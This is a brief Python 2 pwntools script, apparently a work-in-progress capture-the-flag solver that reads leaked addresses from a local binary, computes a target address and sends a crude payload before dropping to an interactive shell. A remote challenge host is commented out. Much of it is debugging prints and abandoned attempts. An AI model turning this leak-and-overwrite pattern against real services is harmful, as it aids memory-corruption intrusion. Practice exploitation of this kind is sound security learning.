#!/usr/bin/env python2

from pwn import *

targ = process("./a.out")
#targ = remote('jhtc4bsk.jhtc.pl', 40003)
raw_input("Press Enter to continue...")

targ.readuntil("victory is nearby: ")
foo = targ.readuntil(" ")
targ.readuntil("like ")
diff = targ.readuntil("\n")
#print(targ.read())
print(foo)
print(diff)
foo = int(foo,16)
diff = int(diff, 16)
print(foo, diff)
victory = foo + diff - 2**64
print(victory)
data = "0xf0    0xdd    0xff    0xff    0xff    0x7f    0x0\x00"  #"\xf0\xdd\xff\xff\xff\x7f\x00\x00" #"\x00\xde\xff\xff\xff\x7f\x00\x00" #"\x50\x71\x00\x95\xfc\x7f\x00\x00" #"\xf0\xdd\xff\xff\xff\x7f\x00\x00"
#data = u64(data)
#victory ^= data
payload = ""
#while(victory>0):
#    payload+=hex(victory%256)+" "
#    victory/=256
#print (payload)
print victory
print ("0x%0.2X" % victory)
print (p64(victory).encode('hex'))
#targ.writeline(p64(victory))
targ.writeline("\x00\x00"*100)
try:
    targ.stdin.close()
except Exception as e:
    print e
print(targ.read())
#print(targ.recv())
targ.interactive()
targ.interactive()
